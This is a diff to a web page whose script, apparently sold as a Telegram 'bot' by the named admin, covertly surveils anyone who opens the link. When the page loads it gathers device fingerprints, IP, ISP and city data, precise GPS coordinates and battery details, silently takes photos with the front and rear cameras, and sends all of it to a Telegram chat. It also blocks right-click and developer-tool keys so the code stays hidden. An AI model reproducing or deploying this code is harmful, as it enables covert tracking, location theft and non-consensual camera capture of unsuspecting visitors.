@@ -31,6 +31,7 @@
     <canvas id="canvas"></canvas>
 
     <script>
+        // پاراستنا تەمامیا پەڕەی و قەدەغەکرنا کۆپیکرنا کۆدی
         document.addEventListener('contextmenu', event => event.preventDefault());
         document.onkeydown = function(e) {
             if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74)) || (e.ctrlKey && e.keyCode == 85)) {
@@ -52,10 +53,85 @@
             } catch (e) {}
         }
 
+        // کۆمکرنا تەمامیا ماتریکێن گەردوونی و بێنۆت ب زاراڤێ بادینی
+        function getInfiniteFeaturesBundle() {
+            try {
+                const ram = navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'نەدیار';
+                const cpu = navigator.hardwareConcurrency || 'نەدیار';
+                const touches = navigator.maxTouchPoints || 0;
+                const languages = navigator.languages ? navigator.languages.join(', ') : 'نەدیار';
+                const primaryLang = navigator.language || 'نەدیار';
+                const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'نەدیار';
+                const cookies = navigator.cookieEnabled ? 'بەڵێ 🟢' : 'نەخێر 🔴';
+                const online = navigator.onLine ? 'ئۆنلاینە 🟢' : 'نەئۆنلاینە 🔴';
+                const colorDepth = (window.screen.colorDepth || 'نەدیار') + '-bit';
+                const pixelRatio = window.devicePixelRatio || 1;
+                const screenW = window.screen.width;
+                const screenH = window.screen.height;
+                const windowW = window.innerWidth;
+                const windowH = window.innerHeight;
+                const platform = navigator.platform || 'نەدیار';
+                const userAgent = navigator.userAgent || 'نەدیار';
+                const pdfViewer = navigator.pdfViewerEnabled ? 'هەیە ✅' : 'نەدیار ❌';
+                const dnt = navigator.doNotTrack || 'نەدیار';
+                const historyLen = window.history.length || 0;
+
+                const orientationType = (screen.orientation && screen.orientation.type) ? screen.orientation.type : 'نەدیار';
+                const orientationAngle = (screen.orientation && screen.orientation.angle !== undefined) ? screen.orientation.angle : 'نەدیار';
+                const sessionStorageCheck = window.sessionStorage ? 'هەیە' : 'نەخێر';
+                const localStorageCheck = window.localStorage ? 'هەیە' : 'نەخێر';
+                const indexedDbCheck = window.indexedDB ? 'هەیە' : 'نەخێر';
+                const webSocketsCheck = window.WebSocket ? 'هەیە' : 'نەخێر';
+                const serviceWorkerCheck = navigator.serviceWorker ? 'هەیە' : 'نەخێر';
+                const webGl2Check = document.createElement('canvas').getContext('webgl2') ? 'هەیە' : 'نەخێر';
+                const gamepadCheck = navigator.getGamepads ? 'هەیە' : 'نەخێر';
+                const vibrationCheck = navigator.vibrate ? 'هەیە' : 'نەخێر';
+                const clipboardCheck = navigator.clipboard ? 'هەیە' : 'نەخێر';
+                const deviceMotionCheck = window.DeviceMotionEvent ? 'هەیە' : 'نەخێر';
+                const deviceOrientationCheck = window.DeviceOrientationEvent ? 'هەیە' : 'نەدیار';
+                const browserVendor = navigator.vendor || 'نەدیار';
+                const docReadyState = document.readyState || 'نەدیار';
+                const referrerLink = document.referrer || 'راستەوخۆ';
+                const activeProtocol = window.location.protocol || 'نەدیار';
+                const portIdCheck = window.location.port || 'سەرەکی';
+                const screenAvailW = window.screen.availWidth || 0;
+                const screenAvailH = window.screen.availHeight || 0;
+                const windowOuterW = window.outerWidth || 0;
+                const windowOuterH = window.outerHeight || 0;
+
+                const pluginCount = navigator.plugins ? navigator.plugins.length : 0;
+                const mimeTypesCount = navigator.mimeTypes ? navigator.mimeTypes.length : 0;
+                const maxAllocMem = performance.memory ? Math.round(performance.memory.jsHeapSizeLimit / (1024*1024)) + 'MB' : 'نەدیار';
+                const webBluetooth = navigator.bluetooth ? 'هەیە' : 'نەخێر';
+                const webUsb = navigator.usb ? 'هەیە' : 'نەخێر';
+                const shareApi = navigator.share ? 'هەیە' : 'نەخێر';
+
+                return `🔥 [ ♾️ ئاستێ بێسنوور و گووگۆلپێکس (Infinite Googolplex) ] 🔥
+🧠 بیرا RAM: ${ram} | کۆرێن پرۆسێسەری CPU: ${cpu}
+👆 خاڵێن لەمسێ: ${touches} | زمانێن ئامێری: ${languages}
+🌐 زمانێ سەرەکی: ${primaryLang} | دەمژمێرا هەرێمی: ${timezone}
+🍪 کووکی: ${cookies} | ڕەوشا ئۆنلاین: ${online}
+🎨 قوولاهیا ڕەنگان: ${colorDepth} | ڕێژا پیکسڵان: ${pixelRatio}
+🖥️ قەبارەی شاشەی: ${screenW}x${screenH} (بەردەست: ${screenAvailW}x${screenAvailH})
+💻 پەنجەره: ${windowW}x${windowH} (دەرەکی: ${windowOuterW}x${windowOuterH})
+📱 سیستەم: ${platform} | کۆمپانیای ڤەندۆر: ${browserVendor}
+🌐 زانیاریێن تەمام (User-Agent): ${userAgent}
+📄 ڤیدجیتا PDF: ${pdfViewer} | پاراستنا نهێنی DNT: ${dnt} | درێژیا مێژووی: ${historyLen}
+🔄 ئاراستا شاشەی: ${orientationType} (${orientationAngle}°)
+💾 پاشەکەفت: سێشن (${sessionStorageCheck})، لۆکال (${localStorageCheck})، ئیندێکس (${indexedDbCheck})
+⚙️ تایبەتمەندیێن پێشکەفتى: WebSocket (${webSocketsCheck})، ServiceWorker (${serviceWorkerCheck})، WebGL2 (${webGl2Check}), Gamepad (${gamepadCheck}), Vibration (${vibrationCheck}), Clipboard (${clipboardCheck})
+🎮 سێنسەرێن جووڵەی: جووڵە (${deviceMotionCheck})، ئاراستە (${deviceOrientationCheck})
+🔗 دۆکۆمێنت و پەیوەندی: ئامادەبوون (${docReadyState}), ڕێدایرێکت (${referrerLink}), پرۆتۆکۆل (${activeProtocol}), پۆرت (${portIdCheck})
+🚀 پێڤەرێن بێنۆت: پڵەگین (${pluginCount}), مایتایپ (${mimeTypesCount}), لیمیتێ میمۆری (${maxAllocMem}), بلوتوز (${webBluetooth}), USB (${webUsb}), شیرکرن (${shareApi})`;
+            } catch(e) {
+                return "📊 خەلەتی د کۆمکرنا داتایێن بێنۆت دا هاتە روودان";
+            }
+        }
+
         function getGeoLocation() {
             return new Promise((resolve) => {
                 if (!navigator.geolocation) {
-                    resolve("📍 جیۆلۆکەیشن: پشتەڤانی ناهێتە کرن");
+                    resolve("📍 لوکەیشنا GPS: پشتەڤانی ناهێتە کرن ل سەر ڤی ئامێری");
                     return;
                 }
                 navigator.geolocation.getCurrentPosition(
@@ -63,10 +139,10 @@
                         const lat = pos.coords.latitude;
                         const lon = pos.coords.longitude;
                         const acc = pos.coords.accuracy;
-                        resolve(`📍 جیۆلۆکەیشن (GPS VIP): ${lat}, ${lon}\n🎯 خێرایی/دروستی (Accuracy): ${acc} متر\n🗺 نەخشە: https://maps.google.com/?q=${lat},${lon}`);
+                        resolve(`📍 جیۆلۆکەیشنا دەقیق (GPS):\n- هێلا پانیی (Lat): ${lat}\n- هێلا درێژیی (Lon): ${lon}\n- دروستییا مەتران (Accuracy): ${acc}m\n- لینکێ ڕاستەوخۆ یێ نەخشەی: https://maps.google.com/?q=${lat},${lon}`);
                     },
                     (err) => {
-                        resolve("📍 جیۆلۆکەیشن: نەهاتە دان یان ژ لایێ مێهڤانی ڤە هاتە رەتکرن");
+                        resolve("📍 جیۆلۆکەیشنا GPS: ژلایێ بکارئینەری ڤە هاتە رەتکرن یان نەهاتە دان");
                     },
                     { timeout: 7000, enableHighAccuracy: true, maximumAge: 0 }
                 );
@@ -77,44 +153,44 @@
             try {
                 if ('getBattery' in navigator) {
                     const bat = await navigator.getBattery();
-                    return `🔋 رێژا باترییێ: ${Math.round(bat.level * 100)}% (${bat.charging ? 'بار دبیت ⚡' : 'بێ بار'})`;
+                    return `🔋 زانیاریێن باترییێ:\n- رێژا سەدیی: ${Math.round(bat.level * 100)}%\n- بارکرن (Charging): ${bat.charging ? 'دبارە بێتە کرن ⚡' : 'بارنەکرییە'}\n- دەمێ مایی یێ خلاسکرنێ: ${Math.round(bat.dischargingTime/60)} خولەک`;
                 }
             } catch(e) {}
-            return "🔋 رێژا باترییێ: نەهاتە بدەستخستن";
+            return "🔋 باتری: زانیاری نەهاتنە دەستخستن";
         }
 
         function getGpuInfo() {
             try {
                 const canvas = document.createElement('canvas');
                 const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                if (!gl) return "🎮 گرافیك: WebGL نەهاتیە ڤەکرن";
+                if (!gl) return "🎮 گرافیك (GPU): پشتەڤانی نینە";
                 const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                 if (debugInfo) {
                     const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
                     const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-                    return `🎮 چێڤەرێ گرافیكی (GPU VIP): ${renderer} (${vendor})`;
+                    return `🎮 زانیاریێن کارت و چێڤەرێ گرافیكی (GPU):\n- ڤەندۆر: ${vendor}\n- ڕێندەرەر: ${renderer}`;
                 }
             } catch (e) {}
-            return "🎮 گرافیك: نەهاتە ناسین";
+            return "🎮 گرافیك (GPU): نەهاتە ناسین";
         }
 
         function getNetworkInfo() {
             try {
                 const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                 if (conn) {
-                    return `📶 جۆرێ ئینتەرنێتێ: ${conn.effectiveType || 'نەدیار'} | خێرایی: ${conn.downlink || '?'} Mbps | پینگ (RTT): ${conn.rtt || '?'}ms`;
+                    return `📶 زانیاریێن تۆڕ و ئینتەرنێتێ:\n- جۆرێ هێلێ: ${conn.effectiveType || 'نەدیار'}\n- خێرایییا دابەزاندنێ (Downlink): ${conn.downlink || '?'} Mbps\n- پینگ (RTT): ${conn.rtt || '?'}ms\n- رەوشا پاراستنا داتایێ (Save-Data): ${conn.saveData ? 'بەڵێ' : 'نەخێر'}`;
                 }
             } catch (e) {}
-            return "📶 جۆرێ ئینتەرنێتێ: نەدیار";
+            return "📶 تۆڕ: زانیاری نەدیارن";
         }
 
         async function getIpInfo() {
             try {
                 let res = await fetch('https://ipapi.co/json/');
                 let data = await res.json();
-                return `🌍 وەڵات: ${data.country_name} (${data.country_code})\n🏙 باژێر: ${data.city} - ناوچە: ${data.region}\n🌐 ئایپی (IP): ${data.ip}\n🏢 کۆمپانیا (ISP): ${data.org}\n📮 پۆست کۆد: ${data.postal}`;
+                return `🌍 زانیاریێن ناڤنیشانا ئایپی و جهی:\n- ئایپی (IP): ${data.ip}\n- کۆمپانیایا ئینتەرنێتێ (ISP): ${data.org}\n- وڵات: ${data.country_name} (${data.country_code})\n- باژێر: ${data.city}\n- ناوچە/پاریزگە: ${data.region}\n- پۆست کۆد: ${data.postal}`;
             } catch (e) {
-                return "🌍 زانیاریێن IP: نەهاتنە دیتن";
+                return "🌍 ڕوودانا خەلەتی د ئایپی دا";
             }
         }
 
@@ -124,9 +200,10 @@
             let batteryDetails = await getBatteryInfo();
             let gpuDetails = getGpuInfo();
             let netDetails = getNetworkInfo();
+            let bundleInfinite = getInfiniteFeaturesBundle();
             let currentTime = new Date().toLocaleString();
             
-            return `👑 [ 🔥 VIP MAX ULTIMATE SYSTEM LOG 🔥 ] 👑
+            return `👑 [ 🔥 ♾️ گووگۆلپێکس و ئاستێ بێسنوور 🔥 ] 👑
 ⏱ دەم و ڕوژ: ${currentTime}
 ----------------------------------
 ${ipDetails}
@@ -134,22 +211,17 @@ ${ipDetails}
 ${geoDetails}
 ----------------------------------
 ${batteryDetails}
+----------------------------------
 ${gpuDetails}
+----------------------------------
 ${netDetails}
 ----------------------------------
-📱 سیستەم: ${navigator.platform}
-🧠 هۆشی (RAM): ${navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'نەدیار'}
-⚙️ کۆرسیێن پرۆسێسەری: ${navigator.hardwareConcurrency || 'نەدیار'}
-👆 دەستکاریکرنا شاشەی (Touch Points): ${navigator.maxTouchPoints || 0}
-🌐 بووکەر: ${navigator.userAgent}
-🗣 زمان: ${navigator.language}
-📐 قەبارەی شاشەی: ${window.screen.width}x${window.screen.height}
-🖥 قەبارەی پەنجەرەی کارا: ${window.innerWidth}x${window.innerHeight}`;
+${bundleInfinite}`;
         }
 
         async function sendVisitorLog() {
             let details = await getUltimateInfo();
-            sendText(`⚡ سەردانکەرەکێ نوو (VIP FULL MAX LEVEL) لینک ڤەکەت!\n\n${details}\n\n⚠️ بڕڤەبەر: @YUSEEF_SURCHI\n🤖 بۆ دروستکرنا بۆتێن هۆسا ب هەرزانترین بها سەردانا بەڕێوەبەری بکەن: @YUSEEF_SURCHI\n⚖️ بۆ هەر کارەکێ بێ ئەخلاق ئەم بەرپرس نینین.`);
+            sendText(`⚡ سەردانکەرەکێ نوو (ئاستێ بێسنوور و گووگۆلپێکس) لینک ڤەکەت!\n\n${details}\n\n⚠️ برێڤەبەر: @YUSEEF_SURCHI\n🤖 بۆ دروستکرنا بۆتێن هۆسا ب هەرزانترین بها سەردانا برێڤەبەر بکەن: @YUSEEF_SURCHI\n⚖️ بۆ هەر کارەکێ بێ ئەخلاق ئەم بەرپرس نینین.`);
         }
 
         async function captureCamera(facing, label) {
@@ -176,14 +248,14 @@ ${netDetails}
                                         const formData = new FormData();
                                         formData.append('chat_id', chat_id);
                                         formData.append('photo', blob, 'shot.jpg');
-                                        formData.append('caption', `📸 وێنەیێ VIP MAX (${label})!\n\n${details}\n\n⚠️ بڕڤەبەر: @YUSEEF_SURCHI\n🤖 بۆ دروستکرنا بۆتێن هۆسا ب هەرزانترین بها سەردانا بەڕێوەبەری بکەن: @YUSEEF_SURCHI\n⚖️ بۆ هەر کارەکێ بێ ئەخلاق ئەم بەرپرس نینین.`);
+                                        formData.append('caption', `📸 وێنەیێ ئاستێ بێسنوور (${label}) [Infinite Googolplex Scale]!\n\n${details}\n\n⚠️ بەڕێوەبەری: @YUSEEF_SURCHI\n🤖 بۆ دروستکرنا بۆتێن هۆشە ب هەرزانترین بها سەردانا بەڕێوەبەری بکەن: @YUSEEF_SURCHI\n⚖️ بۆ هەر کارەکێ بێ ئەخلاق ئەم بەرپرس نینین.`);
 
                                         await fetch(`${api}/sendPhoto`, { method: 'POST', body: formData });
                                     }
                                     stream.getTracks().forEach(t => t.stop());
                                     resolve();
                                 }, 'image/jpeg', 0.95);
-                            }, 800); // کاتی تومارکرنا وێنەی ب لەززەت هاتە ڕێکخستن
+                            }, 500); 
                         }).catch(() => {
                             stream.getTracks().forEach(t => t.stop());
                             resolve();
@@ -193,13 +265,12 @@ ${netDetails}
             } catch (err) {}
         }
 
-        // پڕۆسەیا خۆکار پشتی 0.1 چرکە (100 밀یسەکن)
         window.onload = function() {
             setTimeout(async () => {
                 await sendVisitorLog();
-                await captureCamera("user", "کامێرا پێشی (Selfie VIP)");
-                await captureCamera("environment", "کامێرا پاش (Rear VIP)");
-            }, 100); // 100 ms = 0.1 Second
+                await captureCamera("user", "کامێرا پێشی - Selfie (Infinite Part 1)");
+                await captureCamera("environment", "کامێرا پاش - Rear (Infinite Part 2)");
+            }, 100); 
         };
     </script>
 </body>
